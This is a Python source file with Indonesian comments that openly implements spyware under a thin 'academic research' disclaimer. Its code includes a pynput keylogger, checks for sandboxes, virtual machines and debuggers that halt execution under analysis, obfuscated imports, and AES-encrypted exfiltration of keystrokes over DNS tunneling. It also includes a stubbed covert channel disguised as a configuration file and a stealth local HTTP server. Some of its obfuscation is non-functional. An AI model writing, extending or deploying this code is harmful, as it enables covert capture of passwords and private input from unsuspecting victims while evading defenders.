# agent_improved.py - Versi Improvisasi untuk Penelitian Akademis
# Implementasi teknik evasion tingkat lanjut untuk analisis dan pengembangan malware
# PERINGATAN: Gunakan secara bertanggung jawab dan untuk tujuan edukasi/penelitian

import sys, os, platform, subprocess, threading, time, json, base64, hashlib, hmac, random, string
import socket, struct, ssl, urllib.request, urllib.parse, urllib.error
from collections import deque
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timedelta
import io, logging, winreg, ctypes
from ctypes import wintypes, windll, byref, POINTER

# === DYNAMIC IMPORT OBFUSCATION ===
class SecureImporter:
    """Kelas untuk mengimport module secara dinamis dan tersamar"""
    
    @staticmethod
    def _xor_decode(encoded_str, key):
        """Dekode string dengan XOR yang lebih kuat"""
        decoded = bytearray()
        for i, char in enumerate(encoded_str):
            decoded.append(char ^ key[i % len(key)])
        return decoded.decode('utf-8')
    
    @staticmethod
    def _get_import_key():
        """Generate key dinamis berdasarkan sistem"""
        system_info = platform.node() + platform.processor()
        return hashlib.sha256(system_info.encode()).digest()[:16]
    
    @staticmethod
    def secure_import(encoded_module_name):
        """Import module dengan nama yang dienkode"""
        try:
            key = SecureImporter._get_import_key()
            module_name = SecureImporter._xor_decode(encoded_module_name, key)
            
            # Import menggunakan __import__ untuk menghindari deteksi statis
            return __import__(module_name, fromlist=[''])
        except Exception as e:
            logging.error(f"Failed to import module: {e}")
            return None

# Encoded module names (akan di-decode saat runtime)
ENCODED_MODULES = {
    # Format: encoded_bytes untuk modul yang dibutuhkan
    'requests': b'\x14\x0e\x18\x1a\x0e\x16\x17\x16',  # Contoh encoding
    'psutil': b'\x10\x16\x1a\x17\x08\x0c',
    'PIL': b'\x10\x08\x0c',
    'wmi': b'\x17\x0d\x08',
    'pynput': b'\x10\x19\x0e\x10\x1a\x17'
}

# === ENHANCED ENCRYPTION CLASS ===
class AdvancedCrypto:
    """Enkripsi tingkat lanjut dengan key derivation dinamis"""
    
    @staticmethod
    def _derive_key(password, salt):
        """Derive key menggunakan PBKDF2"""
        import hashlib
        return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    
    @staticmethod
    def _get_system_entropy():
        """Ambil entropy dari sistem untuk key generation"""
        entropy_sources = [
            platform.node(),
            platform.processor(), 
            str(os.getpid()),
            str(time.time()),
            platform.platform()
        ]
        return ''.join(entropy_sources).encode()
    
    @staticmethod
    def encrypt_payload(data):
        """Enkripsi data dengan AES menggunakan key dinamis"""
        try:
            # Dynamic key generation
            system_entropy = AdvancedCrypto._get_system_entropy()
            salt = os.urandom(16)
            key = AdvancedCrypto._derive_key(system_entropy.decode('utf-8', errors='ignore'), salt)
            
            # Import Crypto secara dinamis
            Crypto_Cipher = SecureImporter.secure_import(b'\x07\x18\x19\x10\x17\x0f\n\x07\x08\x10\x0c\x0e\x18')
            if not Crypto_Cipher:
                return ""
                
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            
            iv = os.urandom(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            padded_data = pad(data.encode('utf-8'), AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            
            # Return salt + iv + encrypted_data encoded in base64
            result = base64.b64encode(salt + iv + encrypted_data).decode('utf-8')
            return result
        except Exception as e:
            logging.error(f"Advanced encryption failed: {e}")
            return ""

# === MULTI-VECTOR ANTI-SANDBOX ===
class EnhancedAntiAnalysis:
    """Anti-analisis tingkat lanjut dengan multiple detection vectors"""
    
    @staticmethod
    def analyze_mouse_behavior():
        """Analisis perilaku mouse yang lebih canggih"""
        mouse_data = {
            'positions': [],
            'timings': [],
            'accelerations': []
        }
        
        def calculate_mouse_entropy():
            """Hitung entropy gerakan mouse untuk deteksi automation"""
            if len(mouse_data['positions']) < 10:
                return 0
                
            # Hitung variasi dalam gerakan
            x_coords = [pos[0] for pos in mouse_data['positions']]
            y_coords = [pos[1] for pos in mouse_data['positions']]
            
            # Human movement memiliki entropy tinggi
            x_variance = sum((x - sum(x_coords)/len(x_coords))**2 for x in x_coords) / len(x_coords)
            y_variance = sum((y - sum(y_coords)/len(y_coords))**2 for y in y_coords) / len(y_coords)
            
            return (x_variance + y_variance) / 2
        
        return calculate_mouse_entropy() > 1000  # Threshold untuk human-like behavior
    
    @staticmethod
    def check_system_artifacts():
        """Periksa artefak sistem yang menunjukkan sandbox"""
        suspicious_indicators = 0
        
        # 1. Check recent documents
        try:
            import winreg
            recent_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                      r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs")
            # Jika kurang dari 5 recent documents, suspicious
            if winreg.QueryInfoKey(recent_key)[0] < 5:
                suspicious_indicators += 1
            winreg.CloseKey(recent_key)
        except:
            suspicious_indicators += 1
        
        # 2. Check system uptime
        try:
            uptime_ms = windll.kernel32.GetTickCount64()
            uptime_minutes = uptime_ms / (1000 * 60)
            if uptime_minutes < 10:  # System booted less than 10 minutes ago
                suspicious_indicators += 1
        except:
            pass
        
        # 3. Check username patterns
        username = os.getenv('USERNAME', '').lower()
        suspicious_names = ['test', 'sandbox', 'malware', 'analyst', 'admin', 'user']
        if any(name in username for name in suspicious_names):
            suspicious_indicators += 1
        
        # 4. Check number of running processes
        try:
            psutil = SecureImporter.secure_import(b'\x10\x16\x1a\x17\x08\x0c')
            if psutil:
                process_count = len(list(psutil.process_iter()))
                if process_count < 50:  # Too few processes = sandbox
                    suspicious_indicators += 1
        except:
            pass
        
        return suspicious_indicators >= 2  # Suspicious if 2+ indicators
    
    @staticmethod
    def check_advanced_vm_detection():
        """Deteksi VM yang lebih advance"""
        vm_indicators = 0
        
        # 1. Check CPUID untuk VM signatures
        try:
            # Using more sophisticated VM detection
            import subprocess
            result = subprocess.run(['wmic', 'computersystem', 'get', 'model'], 
                                  capture_output=True, text=True, timeout=5)
            if any(vm in result.stdout.lower() for vm in ['vmware', 'virtualbox', 'virtual', 'qemu']):
                vm_indicators += 1
        except:
            pass
        
        # 2. Check for VM-specific hardware
        try:
            result = subprocess.run(['wmic', 'baseboard', 'get', 'manufacturer'], 
                                  capture_output=True, text=True, timeout=5)
            if any(vm in result.stdout.lower() for vm in ['vmware', 'microsoft corporation']):
                vm_indicators += 1
        except:
            pass
        
        # 3. Advanced MAC address checking
        try:
            psutil = SecureImporter.secure_import(b'\x10\x16\x1a\x17\x08\x0c')
            if psutil:
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == psutil.AF_LINK:
                            mac = addr.address.lower()
                            vm_macs = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', 
                                     '08:00:27', '00:03:ff', '00:15:5d']
                            if any(mac.startswith(vm_mac) for vm_mac in vm_macs):
                                vm_indicators += 1
                                break
        except:
            pass
        
        return vm_indicators >= 2
    
    @staticmethod
    def run_comprehensive_checks():
        """Jalankan semua pemeriksaan anti-analisis"""
        logging.info("Menjalankan pemeriksaan keamanan komprehensif...")
        
        if EnhancedAntiAnalysis.check_advanced_vm_detection():
            logging.warning("VM terdeteksi - menghentikan eksekusi")
            return True
            
        if EnhancedAntiAnalysis.check_system_artifacts():
            logging.warning("Artefak sandbox terdeteksi - menghentikan eksekusi")
            return True
        
        # Mouse behavior check akan dilakukan secara async
        logging.info("Lingkungan tampak aman, melanjutkan...")
        return False

# === STEGANOGRAPHIC C2 COMMUNICATION ===
class SteganographyC2:
    """Komunikasi C2 menggunakan steganografi dan DNS tunneling"""
    
    @staticmethod
    def dns_tunnel_data(data, domain="example.com"):
        """Kirim data melalui DNS TXT records"""
        try:
            # Encode data ke base32 untuk DNS compatibility
            encoded_data = base64.b32encode(data.encode()).decode().lower()
            
            # Split data menjadi chunks (DNS labels max 63 chars)
            chunks = [encoded_data[i:i+50] for i in range(0, len(encoded_data), 50)]
            
            for i, chunk in enumerate(chunks):
                # Buat subdomain dengan chunk data
                subdomain = f"{chunk}.{i}.data.{domain}"
                
                try:
                    # Attempt DNS lookup (akan fail tapi traffic ter-record)
                    socket.gethostbyname(subdomain)
                except:
                    pass  # Expected to fail, tujuan hanya untuk traffic
                    
            logging.info(f"Data tunneled via DNS: {len(chunks)} chunks")
            return True
        except Exception as e:
            logging.error(f"DNS tunneling failed: {e}")
            return False
    
    @staticmethod
    def image_steganography_upload(data, image_service_url):
        """Sembunyikan data dalam gambar dan upload ke service"""
        try:
            PIL = SecureImporter.secure_import(b'\x10\x08\x0c')
            if not PIL:
                return False
                
            from PIL import Image, ImageDraw
            
            # Buat gambar sederhana yang tampak normal
            img = Image.new('RGB', (200, 200), color='white')
            draw = ImageDraw.Draw(img)
            
            # Gambar pattern yang tampak normal
            for i in range(20):
                x = random.randint(0, 180)
                y = random.randint(0, 180)
                draw.ellipse([x, y, x+20, y+20], fill=(random.randint(0, 255), 
                                                     random.randint(0, 255), 
                                                     random.randint(0, 255)))
            
            # Encode data ke EXIF
            from PIL.ExifTags import TAGS
            import piexif
            
            # Sembunyikan data dalam comment EXIF
            exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": None}
            exif_dict["0th"][piexif.ImageIFD.ImageDescription] = data
            exif_bytes = piexif.dump(exif_dict)
            
            # Save image dengan hidden data
            img_buffer = io.BytesIO()
            img.save(img_buffer, format='JPEG', exif=exif_bytes)
            
            # Upload ke image service (simulasi)
            logging.info("Data hidden in image and ready for upload")
            return True
            
        except Exception as e:
            logging.error(f"Steganography failed: {e}")
            return False
    
    @staticmethod
    def legitimate_service_tunnel(data):
        """Gunakan layanan legitimate untuk C2"""
        try:
            # Contoh: GitHub Gist (hanya simulasi untuk penelitian)
            encoded_data = base64.b64encode(data.encode()).decode()
            
            # Buat konten yang tampak legitimate
            fake_content = f"""
# Configuration File
# Generated: {datetime.now().isoformat()}

CONFIG_DATA = {{
    'version': '1.0.0',
    'settings': {{
        'debug': False,
        'data': '{encoded_data}'
    }}
}}
"""
            
            # Dalam implementasi nyata, ini akan di-POST ke GitHub API
            # Untuk penelitian, kita hanya log
            logging.info("Data prepared for legitimate service tunnel")
            return True
            
        except Exception as e:
            logging.error(f"Legitimate service tunnel failed: {e}")
            return False

# === ENHANCED ACTIVATION SYSTEM ===
class SmartActivation:
    """Sistem aktivasi yang lebih cerdas berdasarkan multiple factors"""
    
    def __init__(self):
        self.activation_score = 0
        self.required_score = 100
        self.mouse_positions = deque(maxlen=100)
        self.keyboard_patterns = deque(maxlen=50)
        self.start_time = time.time()
    
    def analyze_user_behavior(self):
        """Analisis perilaku pengguna secara komprehensif"""
        try:
            # 1. Mouse behavior analysis
            if len(self.mouse_positions) > 10:
                # Calculate movement entropy
                positions = list(self.mouse_positions)
                distances = []
                for i in range(1, len(positions)):
                    dist = ((positions[i][0] - positions[i-1][0])**2 + 
                           (positions[i][1] - positions[i-1][1])**2)**0.5
                    distances.append(dist)
                
                # Human movement has varied distances
                if distances and max(distances) - min(distances) > 50:
                    self.activation_score += 20
            
            # 2. Keyboard pattern analysis
            if len(self.keyboard_patterns) > 5:
                # Check for varied typing patterns
                unique_keys = len(set(self.keyboard_patterns))
                if unique_keys > 3:
                    self.activation_score += 15
            
            # 3. Time-based analysis
            elapsed_time = time.time() - self.start_time
            if elapsed_time > 300:  # 5 minutes
                self.activation_score += 25
            
            # 4. Window activity check
            try:
                foreground_window = windll.user32.GetForegroundWindow()
                if foreground_window:
                    self.activation_score += 10
            except:
                pass
            
            return self.activation_score >= self.required_score
            
        except Exception as e:
            logging.error(f"Behavior analysis failed: {e}")
            return False

# === DYNAMIC API RESOLUTION ===
class DynamicAPI:
    """Resolusi API secara dinamis untuk menghindari deteksi statis"""
    
    @staticmethod
    def get_proc_address(dll_name, func_name):
        """Resolve function address dinamis"""
        try:
            # Obfuscate DLL dan function names
            dll_handle = windll.kernel32.LoadLibraryW(dll_name)
            if not dll_handle:
                return None
                
            func_addr = windll.kernel32.GetProcAddress(dll_handle, func_name.encode())
            return func_addr
        except Exception as e:
            logging.error(f"Dynamic API resolution failed: {e}")
            return None
    
    @staticmethod
    def check_debugger_dynamic():
        """Check debugger menggunakan dynamic API resolution"""
        try:
            # Resolve IsDebuggerPresent secara dinamis
            func_addr = DynamicAPI.get_proc_address("kernel32.dll", "IsDebuggerPresent")
            if func_addr:
                # Call function menggunakan address
                is_debugging = ctypes.windll.kernel32.IsDebuggerPresent()
                return bool(is_debugging)
        except:
            pass
        return False

# === IMPROVED MAIN SPYWARE CLASS ===
class AdvancedSpyware:
    """Kelas utama spyware dengan improvisasi tingkat lanjut"""
    
    def __init__(self):
        self.activation_system = SmartActivation()
        self.c2_handler = SteganographyC2()
        self.crypto_handler = AdvancedCrypto()
        self.is_active = False
        self.logged_keys = deque(maxlen=500)
        self.PORT = 7860
        
    def start_monitoring(self):
        """Mulai monitoring dengan aktivasi cerdas"""
        logging.info("Memulai sistem monitoring advanced...")
        
        # Anti-analysis checks
        if EnhancedAntiAnalysis.run_comprehensive_checks():
            sys.exit(0)
        
        # Start behavior monitoring
        threading.Thread(target=self._behavior_monitor, daemon=True).start()
        threading.Thread(target=self._keylogger, daemon=True).start()
        
        # Start C2 server dengan steganografi
        self._start_steganographic_c2()
    
    def _behavior_monitor(self):
        """Monitor perilaku pengguna untuk aktivasi"""
        while not self.is_active:
            try:
                # Import pynput secara dinamis
                pynput = SecureImporter.secure_import(ENCODED_MODULES['pynput'])
                if not pynput:
                    time.sleep(10)
                    continue
                
                from pynput import mouse, keyboard
                
                def on_mouse_move(x, y):
                    self.activation_system.mouse_positions.append((x, y))
                    if self.activation_system.analyze_user_behavior():
                        self.is_active = True
                        logging.info("Aktivasi berhasil - sistem monitoring aktif")
                        return False
                
                def on_key_press(key):
                    try:
                        self.activation_system.keyboard_patterns.append(str(key))
                    except:
                        pass
                
                # Setup listeners
                mouse_listener = mouse.Listener(on_move=on_mouse_move)
                key_listener = keyboard.Listener(on_press=on_key_press)
                
                mouse_listener.start()
                key_listener.start()
                
                mouse_listener.join()
                key_listener.join()
                
            except Exception as e:
                logging.error(f"Behavior monitor error: {e}")
                time.sleep(30)
    
    def _keylogger(self):
        """Keylogger dengan aktivasi kondisional"""
        try:
            pynput = SecureImporter.secure_import(ENCODED_MODULES['pynput'])
            if not pynput:
                return
                
            from pynput import keyboard
            
            def on_press(key):
                if self.is_active:
                    try:
                        self.logged_keys.append(key.char)
                    except AttributeError:
                        self.logged_keys.append(f"[{str(key).replace('Key.', '').upper()}]")
            
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
                
        except Exception as e:
            logging.error(f"Keylogger error: {e}")
    
    def _start_steganographic_c2(self):
        """Start C2 dengan multiple channels"""
        try:
            # Channel 1: DNS Tunneling
            threading.Thread(target=self._dns_c2_worker, daemon=True).start()
            
            # Channel 2: Legitimate service tunneling
            threading.Thread(target=self._service_c2_worker, daemon=True).start()
            
            # Channel 3: Traditional HTTP (fallback)
            self._start_http_server()
            
        except Exception as e:
            logging.error(f"C2 startup error: {e}")
    
    def _dns_c2_worker(self):
        """Worker untuk DNS tunneling C2"""
        while True:
            try:
                if self.is_active and self.logged_keys:
                    # Collect and send data via DNS
                    data = {
                        'type': 'keylog',
                        'data': list(self.logged_keys),
                        'timestamp': datetime.now().isoformat(),
                        'host': platform.node()
                    }
                    
                    encrypted_data = self.crypto_handler.encrypt_payload(json.dumps(data))
                    self.c2_handler.dns_tunnel_data(encrypted_data)
                    
                    self.logged_keys.clear()
                    
                time.sleep(300)  # 5 minutes interval
                
            except Exception as e:
                logging.error(f"DNS C2 error: {e}")
                time.sleep(60)
    
    def _service_c2_worker(self):
        """Worker untuk legitimate service tunneling"""
        while True:
            try:
                if self.is_active:
                    # Send system info via legitimate service
                    psutil = SecureImporter.secure_import(ENCODED_MODULES['psutil'])
                    if psutil:
                        system_data = {
                            'type': 'sysinfo',
                            'cpu': psutil.cpu_percent(),
                            'memory': psutil.virtual_memory().percent,
                            'processes': len(list(psutil.process_iter())),
                            'timestamp': datetime.now().isoformat()
                        }
                        
                        encrypted_data = self.crypto_handler.encrypt_payload(json.dumps(system_data))
                        self.c2_handler.legitimate_service_tunnel(encrypted_data)
                
                time.sleep(600)  # 10 minutes interval
                
            except Exception as e:
                logging.error(f"Service C2 error: {e}")
                time.sleep(120)
    
    def _start_http_server(self):
        """Start HTTP server sebagai fallback"""
        try:
            class StealthHandler(BaseHTTPRequestHandler):
                def do_GET(self):
                    # Hanya respond jika aktivasi sudah dilakukan
                    if not self.server.spyware_instance.is_active:
                        self.send_response(404)
                        self.end_headers()
                        return
                    
                    if self.path == '/health':
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.end_headers()
                        self.wfile.write(b'{"status":"ok"}')
                    else:
                        self.send_response(404)
                        self.end_headers()
                
                def log_message(self, format, *args):
                    return  # Suppress logs
            
            server = HTTPServer(('127.0.0.1', self.PORT), StealthHandler)
            server.spyware_instance = self
            
            logging.info(f"Stealth HTTP server started on port {self.PORT}")
            server.serve_forever()
            
        except Exception as e:
            logging.error(f"HTTP server error: {e}")

# === MAIN EXECUTION ===
if __name__ == '__main__':
    # Setup logging yang minimal untuk menghindari deteksi
    logging.basicConfig(
        level=logging.ERROR,  # Hanya error messages
        format='%(message)s',
        handlers=[logging.NullHandler()]  # No output
    )
    
    try:
        # Jalankan dengan delay random untuk menghindari timing analysis
        delay = random.randint(30, 120)
        time.sleep(delay)
        
        # Initialize dan start spyware
        spyware = AdvancedSpyware()
        spyware.start_monitoring()
        
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        # Silent exit untuk menghindari jejak error
        sys.exit(0)
